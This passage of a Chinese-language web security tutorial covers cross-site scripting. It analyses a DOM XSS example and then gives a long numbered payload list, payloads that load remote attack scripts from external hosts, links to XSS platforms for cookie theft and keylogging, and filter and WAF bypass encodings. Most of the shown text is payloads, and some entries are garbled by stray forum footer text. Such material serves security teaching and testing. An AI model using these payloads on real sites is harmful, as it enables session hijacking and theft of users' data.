data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631670984283-204e91b2-19b4-4ea0-8f41-7a796a5468a6.png" alt="img"></p><h4 id="代码分析-3"><a class="markdownIt-Anchor" href="#代码分析-3">#</a> 代码分析</h4><p>DOM 型 xss 程序中，只有 html 代码，dom 通过操作 HTML 或者 css 实现 HTML 属性、方法、事件，因此程序中没有与服务器进行交互；</p><p>点击按钮时，会调用 domxss () 函数，跟踪 domxss 函数；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function domxss()&#123;</span><br><span class="line">var str = document.getElementById(&quot;text&quot;).value;</span><br><span class="line">document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#x27;&quot;+str+&quot;&#x27;&gt;what do yousee?&lt;/a&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取 id text 文本的值，修改 id 为 dom 的 html 值，输入 ’ onclick=“alert (‘dom xss 漏洞’)”&gt; 闭合前面的单引号，即可；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631671123576-8cf16755-897f-4755-9c61-b95ce6b54812.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631671421496-260f589a-16c7-44a2-b940-3745afeb70ce.png" alt="img"></p><h1 id="xss-测试语句"><a class="markdownIt-Anchor" href="#xss-测试语句">#</a> xss 测试语句</h1><p>在网站是否存在 xss 漏洞时，应该输入一些标签如 &lt;、&gt; 输入后查看网页源代码是否过滤标签，如果没过滤，很大可能存在 xss 漏洞；</p><p>常用的测试语句：</p><ul><li><ul><li><code>&lt;h5&gt;1&lt;/h5&gt;</code></li><li><code>&lt;span&gt;1&lt;/span&gt;</code></li></ul></li><li><ul><li><code>&lt;script&gt;console.log(1);&lt;/script&gt;</code></li></ul></li></ul><p>闭合：</p><ul><li><ul><li><code>&quot;&gt;&lt;span&gt;x&lt;/span&gt;&lt;&quot;</code></li><li><code>'&gt;&quot;&gt;&lt;span&gt;x&lt;/span&gt;&lt;'</code></li></ul></li></ul><p>单行注释：</p><ul><li><ul><li><code>&quot;&gt;&lt;span&gt;x&lt;/span&gt;//</code></li></ul></li></ul><h1 id="xss-攻击语句"><a class="markdownIt-Anchor" href="#xss-攻击语句">#</a> xss 攻击语句</h1><h4 id="xss-攻击代码"><a class="markdownIt-Anchor" href="#xss-攻击代码">#</a> xss 攻击代码：</h4><p>常用语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;</span><br><span class="line">&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;aa&lt;/a&gt;</span><br><span class="line">(1)普通的 XSS JavaScript 注入</span><br><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(2)IMG 标签 XSS 使用 JavaScript 命令</span><br><span class="line">&lt;IMG SRC=http://3w.org/XSS/xss.js/&gt;</span><br><span class="line">(3)IMG 标签无分号无引号</span><br><span class="line">&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">(4)IMG 标签大小写不敏感</span><br><span class="line">&lt;IMG SRC=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">(5)HTML 编码(必须有分号)</span><br><span class="line">&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;</span><br><span class="line">(6)修正缺陷 IMG 标签</span><br><span class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</span><br><span class="line">(7)formCharCode 标签(计算器)</span><br><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br><span class="line">(8)UTF-8 的 Unicode 编码(计算器)</span><br><span class="line">&lt;IMG SRC=jav..省略..S&#x27;)&gt;</span><br><span class="line">(9)7 位的 UTF-8 的 Unicode 编码是没有分号的(计算器)</span><br><span class="line">&lt;IMG SRC=jav..省略..S&#x27;)&gt;</span><br><span class="line">(10)十六进制编码也是没有分号(计算器)</span><br><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line">(11)嵌入式标签,将 Javascript 分开</span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(12)嵌入式编码标签,将 Javascript 分开</span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(13)嵌入式换行符</span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(14)嵌入式回车</span><br><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(15)嵌入式多行注入 JavaScript,这是 XSS 极端的例子</span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">(16)解决限制字符(要求同页面)</span><br><span class="line">&lt;script&gt;z=&#x27;document.&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;write(&quot;&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;&lt;script&#x27;&lt;/script&gt;&lt;s</span><br><span class="line">cript&gt;z=z+&#x27;</span><br><span class="line">src=ht&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;tp://ww&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;w.shell&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;.ne</span><br><span class="line">t/1.&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;js&gt;&lt;/sc&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;ript&gt;&quot;)&#x27;&lt;/script&gt;&lt;script&gt;eval_r(z)&lt;</span><br><span class="line">/script&gt;</span><br><span class="line">(17)空字符 12-7-1 T00LS - Powered by Discuz! Board</span><br><span class="line">https://www.a.com/viewthread.php?action=printable&amp;tid=15267 2/6perl -e &#x27;print &quot;&lt;IMG</span><br><span class="line">SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27; &gt; out</span><br><span class="line">(18)空字符 2,空字符在国内基本没效果.因为没有地方可以利用</span><br><span class="line">perl -e &#x27;print &quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;&quot;;&#x27; &gt; out</span><br><span class="line">(19)Spaces 和 meta 前的 IMG 标签</span><br><span class="line">&lt;IMG SRC=&quot; javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(20)Non-alpha-non-digit XSS</span><br><span class="line">&lt;SCRIPT/XSS SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(21)Non-alpha-non-digit XSS to 2</span><br><span class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</span><br><span class="line">(22)Non-alpha-non-digit XSS to 3</span><br><span class="line">&lt;SCRIPT/SRC=&quot;http://3w.org/XSS/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(23)双开括号</span><br><span class="line">&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</span><br><span class="line">(24)无结束脚本标记(仅火狐等浏览器)</span><br><span class="line">&lt;SCRIPT SRChttp://3w.org/XSS/xss.js?&lt;B&gt;</span><br><span class="line">(25)无结束脚本标记 2</span><br><span class="line">&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;</span><br><span class="line">(26)半开的 HTML/JavaScript XSS</span><br><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span><br><span class="line">(27)双开角括号</span><br><span class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</span><br><span class="line">(28)无单引号 双引号 分号</span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line">(29)换码过滤的 JavaScript</span><br><span class="line">\&quot;;alert(&#x27;XSS&#x27;);//</span><br><span class="line">(30)结束 Title 标签</span><br><span class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;</span><br><span class="line">(31)Input Image</span><br><span class="line">&lt;INPUT SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(32)BODY Image</span><br><span class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">(33)BODY 标签</span><br><span class="line">&lt;BODY(&#x27;XSS&#x27;)&gt;</span><br><span class="line">(34)IMG Dynsrc</span><br><span class="line">&lt;IMG DYNSRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">(35)IMG Lowsrc</span><br><span class="line">&lt;IMG LOWSRC=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">(36)BGSOUND</span><br><span class="line">&lt;BGSOUND SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(37)STYLE sheet</span><br><span class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(38)远程样式表</span><br><span class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://3w.org/xss.css&quot;&gt;</span><br><span class="line">(39)List-style-image(列表式)</span><br><span class="line">&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br><span class="line">(40)IMG VBscript</span><br><span class="line">&lt;IMG SRC=&#x27;vbscript:msgbox(&quot;XSS&quot;)&#x27;&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</span><br><span class="line">(41)META 链接 url</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;URL=http://;URL=javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br><span class="line">(42)Iframe</span><br><span class="line">&lt;IFRAME SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/IFRAME&gt;</span><br><span class="line">(43)Frame</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/FRAMESET&gt;12-7-1 T00LS - Powered by Discuz!</span><br><span class="line">Boardhttps://www.a.com/viewthread.php?action=printable&amp;tid=15267 3/6</span><br><span class="line">(44)Table</span><br><span class="line">&lt;TABLE BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">(45)TD</span><br><span class="line">&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br><span class="line">(46)DIV background-image</span><br><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">(47)DIV background-image 后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)</span><br><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">(48)DIV expression</span><br><span class="line">&lt;DIV STYLE=&quot;width: expression_r(alert(&#x27;XSS&#x27;));&quot;&gt;</span><br><span class="line">(49)STYLE 属性分拆表达</span><br><span class="line">&lt;IMG STYLE=&quot;xss:expression_r(alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">(50)匿名 STYLE(组成:开角号和一个字母开头)</span><br><span class="line">&lt;XSS STYLE=&quot;xss:expression_r(alert(&#x27;XSS&#x27;))&quot;&gt;</span><br><span class="line">(51)STYLE background-image</span><br><span class="line">&lt;STYLE&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;);&#125;&lt;/STYLE&gt;&lt;ACLASS=XSS&gt;&lt;/A&gt;</span><br><span class="line">(52)IMG STYLE 方式</span><br><span class="line">exppression(alert(&quot;XSS&quot;))&#x27;&gt;</span><br><span class="line">(53)STYLE background</span><br><span class="line">&lt;STYLE&gt;&lt;STYLEtype=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line">(54)BASE</span><br><span class="line">&lt;BASE HREF=&quot;javascript:alert(&#x27;XSS&#x27;);//&quot;&gt;</span><br><span class="line">(55)EMBED 标签,你可以嵌入 FLASH,其中包涵 XSS</span><br><span class="line">&lt;EMBED SRC=&quot;http://3w.org/XSS/xss.swf&quot; &gt;&lt;/EMBED&gt;</span><br><span class="line">(56)在 flash 中使用 ActionScrpt 可以混进你 XSS 的代码</span><br><span class="line">a=&quot;get&quot;;b=&quot;URL(\&quot;&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&#x27;XSS&#x27;);\&quot;)&quot;;eval_r(a+b+c+d);</span><br><span class="line">(57)XML namespace.HTC 文件必须和你的 XSS 载体在一台服务器上</span><br><span class="line">&lt;HTML xmlns:xss&gt;&lt;?import namespace=&quot;xss&quot;</span><br><span class="line">implementation=&quot;http://3w.org/XSS/xss.htc&quot;&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;</span><br><span class="line">(58)如果过滤了你的 JS 你可以在图片里添加 JS 代码来利用</span><br><span class="line">&lt;SCRIPT SRC=&quot;&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(59)IMG 嵌入式命令,可执行任意命令</span><br><span class="line">&lt;IMG SRC=&quot;http://www.a.com/a.php?a=b&quot;&gt;</span><br><span class="line">(60)IMG 嵌入式命令(a.jpg 在同服务器)</span><br><span class="line">Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser</span><br><span class="line">(61)绕符号过滤</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(62)&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(63)&lt;SCRIPT a=&quot;&gt;&quot; &quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(64)&lt;SCRIPT &quot;a=&#x27;&gt;&#x27;&quot; SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(65)&lt;SCRIPT a=`&gt;` SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(66)12-7-1 T00LS - Powered by Discuz! Board</span><br><span class="line">https://www.a.com/viewthread.php?action=printable&amp;tid=15267 4/6&lt;SCRIPT a=&quot;&gt;&#x27;&gt;&quot;</span><br><span class="line">SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(67)&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://3w.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">(68)URL 绕行</span><br><span class="line">&lt;A HREF=&quot;http://127.0.0.1/&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">(69)URL 编码</span><br><span class="line">&lt;A HREF=&quot;http://3w.org&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">(70)IP 十进制</span><br><span class="line">&lt;A HREF=&quot;http://3232235521″&gt;XSS&lt;/A&gt;</span><br><span class="line">(71)IP 十六进制</span><br><span class="line">&lt;A HREF=&quot;http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;</span><br><span class="line">(72)IP 八进制</span><br><span class="line">&lt;A HREF=&quot;http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;</span><br><span class="line">(73)混合编码</span><br><span class="line">&lt;A HREF=&quot;http://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">(74)节省[http:]</span><br><span class="line">&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">(75)节省[www]</span><br><span class="line">&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">(76)绝对点绝对 DNS</span><br><span class="line">&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;</span><br><span class="line">(77)javascript 链接</span><br><span class="line">&lt;A HREF=&quot;javascript:document.location=&#x27;http://www.google.com/&#x27;&quot;&gt;XSS&lt;/A&gt;</span><br></pre></td></tr></table></figure><h1 id="加载远程攻击的-payload"><a class="markdownIt-Anchor" href="#加载远程攻击的-payload">#</a> 加载远程攻击的 payload</h1><p>常见的标准 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">注意 网站采用的协议:</span><br><span class="line">&lt;script src=&quot;http://192.168.0.121/xss.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;https://192.168.0.121/xss.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">自动选择协议:</span><br><span class="line">&lt;script src=//192.168.0.121/xss.js&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">图片创建加载连接:</span><br><span class="line">&lt;img src=&#x27;&#x27;</span><br><span class="line">onerror=document.body.appendChild(document.createElement(&#x27;script&#x27;)).src=&#x27;//192.168.0.110/xss.</span><br><span class="line">js&#x27;&gt;</span><br><span class="line"></span><br><span class="line">字符并接</span><br><span class="line">这种一般是输入的字符有限制的时候使用:</span><br><span class="line">&lt;script&gt;z=&#x27;document.&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;write(&quot;&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;&lt;script&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27; src=ht&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;tp://www.&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;xsstools&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;.com/a&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;mER&gt;&lt;/sc&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;ript&gt;&quot;)&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(z)&lt;/script&gt;</span><br><span class="line">有的情况要用/**/注释不需要的代码。</span><br><span class="line"></span><br><span class="line">jquery 加载：</span><br><span class="line">&lt;script&gt;$.getScript(&quot;//www.xsstools.com/amER&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="利用xss平台"><a class="markdownIt-Anchor" href="#利用xss平台">#</a> 利用 XSS 平台</h1><p>在初步探测到 xss 漏洞时，此时我们可以使用 xss 在线平台，去获取一些我们需要的信息，比如位置、键盘记录、ip、表单挟持…</p><p>公网 xss 平台：</p><ul><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly94c3MucHQveHNzLnBocD9kbz1sb2dpbg==">https://xss.pt/xss.php?do=login</span></li><li><span class="exturl" data-url="aHR0cHM6Ly94c3Nocy5jbi94c3MucGhwP2RvPWxvZ2lu">https://xsshs.cn/xss.php?do=login</span></li></ul></li><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly94c3NhcS5jb20veHNzLnBocD9kbz1sb2dpbg==">https://xssaq.com/xss.php?do=login</span></li><li><span class="exturl" data-url="aHR0cHM6Ly94cy5zYi9sb2dpbi8=">https://xs.sb/login/</span></li></ul></li></ul><p>也可以自己搭建：</p><ul><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzc4Nzc4NDQzL3hzc3BsYXRmb3Jt">https://github.com/78778443/xssplatform</span></li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631673256678-59fbc195-047a-430c-a1a8-7bd6a92cf020.png" alt="img"></p><p>COOKIE 介绍：</p><ul><li><ul><li>Cookie 是一些数据，存储于你电脑上的文本文件中</li><li>当 web 服务器向浏览器发送 web 页面时，在连接关闭后，服务端不会记录用户的信息</li></ul></li><li><ul><li>Cookie 的作用就是用于解决 “如何记录客户端的用户信息”</li><li>当用户访问 web 页面时，登录信息可以记录在 cookie 中</li></ul></li><li><ul><li>在用户下一次访问该页面时，可以在 cookie 中读取用户访问记录</li><li>cookie 是有时效性的且遵循同源策略</li></ul></li></ul><p>COOKIE 伪造浏览器插件：</p><ul><li><ul><li>EditThisCookie</li></ul></li></ul><h1 id="xss绕过"><a class="markdownIt-Anchor" href="#xss绕过">#</a> XSS 绕过</h1><h3 id="gpc-过滤字符"><a class="markdownIt-Anchor" href="#gpc-过滤字符">#</a> gpc 过滤字符</h3><p>如果 gpc 开启的时候，特殊字符会被加上斜杠即，‘变成’ ，xss 攻击代码不要带用单引号或双引号。</p><p>绕过 gpc 在 php 高版本 gpc 默认是没有的，但是开发程序员会使用 addcslashes () 对特殊字符进行转义。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这个是执行不了的</span><br><span class="line">&lt;script src=&#x27;http://www.xss123.com/JGdbsl?1623638390&#x27;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">没有单引号可执行</span><br><span class="line">&lt;script src=http://www.xss123.com/JGdbsl?1623638390&gt;&lt;/script&gt; </span><br></pre></td></tr></table></figure><h3 id="过滤-alert"><a class="markdownIt-Anchor" href="#过滤-alert">#</a> 过滤 alert</h3><p>当页面过滤 alert 这个函数时，因为这个函数会弹窗，不仅很多程序会对他进行 过滤，而且很多 waf 都会对其进行拦截。所以不存在 alert 即可；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;prompt(/xss/);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm(1);&lt;/script&gt;</span><br><span class="line">&lt;script src=http://www.xss123.com/eciAKj?1623635663&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="过滤标签"><a class="markdownIt-Anchor" href="#过滤标签">#</a> 过滤标签</h3><p>在程序里如果使用 html 实体过滤，在 php 会使用 htmlspecialchars () 对输入的字符进行实体化，实体化之后的字符不会在 html 执行。把预定义的字符 “&lt;” （小于） 和 “&gt;” （大于）转换为 HTML 实体，构造 xss 恶意代码大多数都必须使用 &lt; 或 者 &gt;，这两个字符被实体化后在 html 里就不能执行了；</p><p>预定义的字符是：</p><ul><li><ul><li>&amp; (和号) 成为 &amp;</li><li>&quot;(双引号) 成为&quot;</li></ul></li><li><ul><li>’ (单引号) 成为 ’</li><li>&lt;(小于) 成为 &lt;</li></ul></li><li><ul><li>&gt;(大于) 成为 &gt;</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631674464484-8bc1b864-2b11-4fb5-9201-22dfc83049d3.png" alt="img"></p><p>但是有在 input 这些标签里是不用考虑标签实体化，因为用不上 &lt;&gt; 这两个标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; onclick=&quot;javascript:alert(&#x27;xss&#x27;);&quot;/&gt;</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631674560015-cfc2b497-9f84-4026-b2ea-ed55a4a5c598.png" alt="img"></p><h3 id="ascii-编码"><a class="markdownIt-Anchor" href="#ascii-编码">#</a> ascii 编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;    </span><br><span class="line">//fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串</span><br></pre></td></tr></table></figure><h3 id="url-编码"><a class="markdownIt-Anchor" href="#url-编码">#</a> url 编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="js-编码"><a class="markdownIt-Anchor" href="#js-编码">#</a> JS 编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 